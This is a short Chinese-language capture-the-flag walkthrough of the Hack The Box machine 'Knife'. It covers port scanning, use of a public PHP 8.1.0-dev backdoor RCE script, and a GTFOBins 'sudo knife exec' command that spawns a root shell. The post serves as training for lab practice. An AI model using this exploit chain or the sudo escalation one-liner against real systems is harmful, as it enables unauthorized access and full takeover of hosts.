---
title: Knife (Hack The Box Writeup)
date: 2021-08-11T13:59:00+08:00
draft: false
url: "/2021/08/11/knife-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

> 
URL : https://app.hackthebox.eu/machines/347

IP : 10.10.69.238

## Recon

- 掃 Port`rustscan -a 10.10.69.238 -r 1-65535`![](/uploads/2022/02/ab932-eytEe9s.png)
- 有開 80 跟 443觀察 Wappalyzer- ![](/uploads/2022/02/90097-uJRIGKU.png)Apache 2.4.41
- PHP8.1.0![](/uploads/2022/02/9bf37-E7SBRv4.png)掃目錄- `python3 dirsearch.py -u http://10.10.10.242/`
- 看起來沒有東西 QQ![](/uploads/2022/02/c45e9-Kx8h2w7.png)

## Exploit

- 找到 php 8.1.0 有 RCE 漏洞https://github.com/flast101/php-8.1.0-dev-backdoor-rce
- `git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce`執行起來- ![](/uploads/2022/02/6ff8c-pzJQzlP.png)
- 就成功拿到 Shell ㄌ也可以執行另外一個 reverse shell 版本- ![](/uploads/2022/02/5c447-4JZGBvV.png)
- ![](/uploads/2022/02/afee6-qZkm9Zo.png)取得 `user.txt`- ![](/uploads/2022/02/9d742-FWppblD.png)

## 提權

- 起手式 `sudo -l`![](/uploads/2022/02/5812f-xPJsZM9.png)
- 發現我們可以用 `sudo knife`[GTFOBins](https://gtfobins.github.io/gtfobins/knife/#sudo) 尋找刀子的 sudo 提權- `sudo knife exec -E 'exec "/bin/sh"'`
- 就提權成功ㄌ
- ![](/uploads/2022/02/604dc-VHcpqD3.png)取得 Root Flag- ![](/uploads/2022/02/19511-UVMDqRH.png)

## 心得

這題提醒我們，還是需要優先確認各種服務的版本號。
